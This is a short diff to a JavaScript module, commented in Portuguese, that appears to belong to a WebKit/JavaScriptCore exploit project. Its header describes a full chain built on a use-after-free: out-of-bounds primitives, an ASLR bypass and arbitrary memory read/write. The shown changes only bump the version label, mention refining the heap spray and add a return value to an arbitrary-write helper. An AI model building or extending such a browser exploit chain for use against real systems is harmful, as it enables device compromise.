@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v149_b - Refinamento da Lógica UAF para Vazamento Direto)
+// js/script3/testArrayBufferVictimCrash.mjs (v150 - Refinamento do Spray UAF)
 // =======================================================================================
 // ESTA É A VERSÃO FINAL QUE INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
 // 1. Validar primitivas básicas (OOB local).
@@ -25,7 +25,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v149_b_UAF_REFINED";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v150_SPRAY_REFINED";
 
 const LOCAL_SHORT_PAUSE = 50;
 const LOCAL_MEDIUM_PAUSE = 500;
@@ -130,6 +130,7 @@ export async function arb_write_universal_js_heap(address, value, byteLength, lo
     } finally {
         await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
     }
+    return value; // Retorna o valor escrito para consistência
 }
 
 // Funções para converter entre JS Double e AdvancedInt64 (do utils.mjs)
